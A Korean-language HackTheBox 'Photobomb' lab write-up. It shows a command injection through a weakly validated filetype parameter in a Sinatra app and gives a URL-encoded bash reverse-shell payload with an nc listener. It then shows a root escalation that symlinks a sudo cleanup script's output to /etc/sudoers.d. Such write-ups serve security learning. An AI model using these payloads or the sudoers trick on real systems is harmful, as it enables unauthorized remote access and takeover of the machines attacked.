
# Table of Contents

1.  [취약점 탐색](#search)
2.  [취약점 공격 및 쉘 획득](#attack)
3.  [권한 상승](#escal)

\#-**- mode: org -**-

본 포스트는 HackTheBox의 Photobomb machine을 해결하고 작성한 writeup이다. 문제를 푸는 과정에서는 여러 방법이 있을 수 있다. 따라서 본 포스트에서 설명하는 풀이는 유일한 정답이 아니다.


<a id="search"></a>

# 취약점 탐색

- 주어진 IP로 접속하면 다음과 같은 홈페이지를 확인할 수 있다.

<img src="https://drive.google.com/uc?export=view&id=12F0Jf3F-qF1trrguU586m2tlxvrLWWYd">

- 이미지 다운로드 페이지로 접속하려면 다음과 같이 credential이 필요하다.
   
<img src="https://drive.google.com/uc?export=view&id=1BdjSeLFNOL3ee9zMeiHNGD7HT-E0gMv5">
   
- credential은 다음과 같이 photobomb.js 에서 확인할 수 있다.

<img src="https://drive.google.com/uc?export=view&id=1H9JgKkTr7fiep7x95sKV-3hjrYKQlMie">
  
- 이미지 다운로드 페이지에서는 다운로드 받을 이미지와 해상도를 선택하여 다운받을 수 있다.

<img src="https://drive.google.com/uc?export=view&id=1Mqh-IM9qvPUhdboWndpw9dBlZv1xbKpb">

- 이미지 다운로드 버튼을 클릭하면 아래의 파라미터들이 POST 메소드를 통해 전달된다.
  
~~~
        photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg&dimensions=30x20
        
~~~
  
  
- 여기서 각각의 파라미터들을 배열 형태로 넘기거나 null값을 넘기면 에러가 발생하는데 에러 페이지에서는 이미지 처리 관련 ruby코드의 일부분을 출력한다. (추가적으로 sinatra라는 패키지를 사용하는 것을 알 수 있다.

<img src="https://drive.google.com/uc?export=view&id=1S8Jrrh3PzRLM7IAIgEx8Wj8GUXd6WJR6">

- 에러를 지속적으로 발생시켜서 출력되는 코드의 일부분들을 조합하여 정리하면 이미지 resize 및 다운로드와 관련된 코드들을 어떻게 동작하는지 확인이 가능하다.

~~~rb
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end

  if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end
~~~

- 상기한 코드를 확인하면 filename은 이미지 원본의 이름, 해상도, 파일 확장자로 구성되고

~~~rb
filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
~~~

- 이 filename은 command의 맨 마지막에 붙는다.

~~~rb
command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
~~~

- 따라서 command의 맨 마지막에 붙는 부분은 filetype 변수이다.

~~~rb
command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
~~~

- 결과적으로 command의 마지막 부분에 &&등을 붙이고 뒤에 리버스 쉘을 실행하는 명령어 (bash -c 'bash -i >& /dev/tcp/ip/port 0>&1')를 붙이면 될 것으로 예상했다.



<a id="attack"></a>

# 취약점 공격 및 쉘 획득

- 우선 netcat 명령어를 로컬 PC의 터미널에서 실행하고

~~~shell
[hackryptic@Hackryptic-PC-1 ~]$ nc -lvnp port
~~~

- filetype 파라미터에 명령어 부분을 직접 넣으면

~~~
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%27&dimensions=30x20
~~~

- Invalid Filetype. 이라는 에러를 출력한다.

<img src="https://drive.google.com/uc?export=view&id=1WkQJNK1qGjfxyiBAUZ-rQa4Vl9DwtgKi">

- 이 에러는 다음과 같은 filetype을 체크하는 정규표현식 부분을 통과하지 못해서 발생하는데

~~~rb
if !filetype.match(/^(png|jpg)/)
    halt 500, 'Invalid filetype.'
  end
~~~

- 문자열의 시작 부분에 png나 jpg가 존재하는가에 대해서만 체크하기 때문에 이 조건만 만족시켜서 다시 파라미터 값을 작성하면 (앞쪽에 jpg나 png만 붙이고 동일하게 작성하면 된다.)

~~~
hoto=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%27&dimensions=30x20
~~~

- 확장자 뒤쪽에 쉘 실행 명령어를 붙이면 다음과 같이 접속에 성공한다.

~~~shell
bash: cannot set terminal process group (722): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 
~~~



<a id="escal"></a>

# 권한 상승

- 우선, sudo -l을 통해 sudo 권한이 걸린 명령어를 확인해보면 다음과 같은 결과가 출력된다.

~~~shell
wizard@photobomb:~/photobomb$ sudo -l

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
~~~

- cleanup.sh 파일의 내용은 다음과 같다.

~~~shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb



# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
~~~


- cleanup.sh는 photobomb.log에 로깅된 내용이 있으면 photobomb.log.old 파일에 덮어쓰고 photobomb.log는 0 bytes로 trunate한다.

- 그리고 root 유저 권한으로 이 작업들을 실행하므로 덮어쓰고자 하는 파일(photobomb.log.old)에 부여된 파일 권한과 상관없이 이 작업을 수행할 수 있다. (어떤 파일이든 덮어쓸 수 있다.)

- 따라서 sudoers 파일을 조작하기 위해 다음과 같이 심볼릭 링크를 걸어준다. (파일이 이미 존재하면 photobomb.log.old 파일을 삭제한 뒤에 링크를 건다.)

~~~shell
wizard@photobomb:~/photobomb$ ln -s /etc/sudoers.d/photobomb ~/photobomb/log/photobomb.log.old
~~~

- 아래와 같이 심볼릭 링크가 제대로 되었는지 확인한 후에

~~~shell
lrwxrwxrwx 1 wizard wizard 24 Nov  8 02:22 /home/wizard/photobomb/log/photobomb.log.old -> /etc/sudoers.d/photobomb
~~~

- sudo 권한을 부여하기 위한 내용을 photobomb.log 파일에 작성하고

~~~shell
wizard@photobomb:~/photobomb$ echo "wizard ALL=(ALL) NOPASSWD: ALL" > ~/photobomb/log/photobomb.log
~~~

- 마지막으로/opt/cleanup.sh를 실행하면

~~~shell
wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh
~~~

- 다음과 같이 root 권한으로 상승할 수 있다.

~~~shell
wizard@photobomb:~/photobomb$ sudo su
root@photobomb:/home/wizard/photobomb#
~~~
